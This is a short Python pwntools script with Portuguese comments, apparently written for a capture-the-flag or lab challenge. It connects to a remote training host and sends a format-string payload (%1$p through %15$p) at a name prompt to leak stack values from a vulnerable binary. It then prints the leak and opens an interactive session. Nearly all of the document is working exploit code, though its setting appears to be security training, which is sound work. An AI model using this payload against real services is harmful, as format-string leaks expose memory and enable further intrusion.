from pwn import *

binary = './vuln_6'
context.binary = elf = ELF(binary)

p = remote('xebec.cylabacademy.net', 13366)

# Envia um payload que vaza os primeiros 15 índices formatados claramente
payload = b"-".join([f"%{i}$p".encode() for i in range(1, 16)])
p.sendlineafter(b'Enter your name:', payload)

response = p.recvline().strip()
print(f"\n[+] Resposta da stack:\n{response}\n")

p.interactive()